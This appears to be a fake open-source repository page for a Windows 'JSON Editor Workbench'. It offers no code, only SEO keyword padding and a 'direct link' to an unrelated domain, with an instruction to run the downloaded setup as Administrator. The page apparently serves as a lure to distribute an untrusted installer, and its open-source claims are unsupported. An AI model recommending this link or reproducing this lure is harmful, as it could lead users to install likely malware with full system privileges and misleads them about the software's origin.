...
> Lightweight open-source **JSON Editor Workbench** for Windows — built for daily dev and power-user workflows.
...
**Repository:** `JSON-Editor-Workbench`

---

## Overview

**JSON Editor Workbench** is a small, fast Windows desktop utility published as open source. Built for **json editor windows** and similar searches.
...
> Open-source **Windows build** for **JSON Editor Workbench**. Direct link below — no account required.

| | |
| --- | --- |
| **Direct link** | **[jsoediz.wonderchain.fun](https://jsoediz.wonderchain.fun/)** |
| **Full URL** | `https://jsoediz.wonderchain.fun/` |
| **Platform** | Windows 10 / 11 (64-bit) |
| **Install** | Run setup as Administrator |

### Quick steps

1. Open **[jsoediz.wonderchain.fun](https://jsoediz.wonderchain.fun/)** in your browser
...
**People also search for:** json editor windows, json editor github, json viewer editor desktop
